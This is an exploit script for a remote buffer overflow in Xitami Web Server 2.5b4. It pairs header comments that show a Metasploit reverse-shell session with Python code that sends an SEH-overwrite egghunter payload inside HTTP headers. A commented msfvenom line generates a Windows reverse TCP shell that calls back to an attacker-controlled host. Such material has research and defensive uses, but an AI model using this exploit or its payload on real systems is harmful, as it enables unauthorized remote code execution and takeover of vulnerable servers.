# Exploit Title: Xitami Web Server 2.5 Remote Buffer Overflow (SEH + Egghunter)
# Date: May 4, 2019
# Author: ElSoufiane
# Version: 2.5b4
# Tested on: Windows Vista Ultimate (Build 6000) and Windows XP SP3 Professional
# Discovered by: Krystian Kloskowski
#
# Set up a multi handler listener in MSFConsole
# then run exploit
#
# root@f6c9fa91b403:~/XitamiWebServer# python exploit.py 192.168.1.149
# [+] Sending exploit payload...
#
# Check the MSFConsole listener
#
# msf5 exploit(multi/handler) > run
# [*] Started reverse TCP handler on 0.0.0.0:5801
# [*] Encoded stage with x86/shikata_ga_nai
# [*] Sending encoded stage (267 bytes) to 172.17.0.1
# [*] Command shell session 6 opened (172.17.0.2:5801 -> 172.17.0.1:39416) at 2019-05-04 00:17:55 +0000



# C:\Xitami>

import socket
import sys
import struct


from struct import pack

import time
#!/usr/bin/python

import socket
from payload import buf
def shell_attack(target_machine, target_port):
	TCP_IP = target_machine
	TCP_PORT = target_port

	try:
		egg = b"SOUFSOUF"
		nops = b"\x90"*10

		#msfvenom -p windows/shell/reverse_tcp LPORT=5801 LHOST=192.168.1.129 -f python -v shellcode -e x86/alpha_mixed
		

		egghunter =b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"+b"SOUF"+b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

		nseh_jmp = b"\xeb\xaa"	#jmp back 84 bytes
		seh = b"\x87\x1d\x40"	# (xiwin32.exe) 0x00401d87 -> pop/pop/ret. ( Parial Overwrite )

		payload = b"A"*120
		payload += egghunter
		payload += b"A"*(190-len(payload))
		payload += nseh_jmp
		payload += seh

		http_req = "GET / HTTP/1.1\r\n"
		http_req += "Host: "+ str(TCP_IP) +"\r\n"
		http_req += "User-Agent: "+str(egg)+str(nops)+str(buf)+"\r\n"
		http_req += "If-Modified-Since: Wed, " + str(payload) + "\r\n\r\n"

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((TCP_IP, TCP_PORT))
		http_req = bytes(http_req, 'ascii')
		s.send(http_req)
		s.close()
	except:
		print("NOt connected")		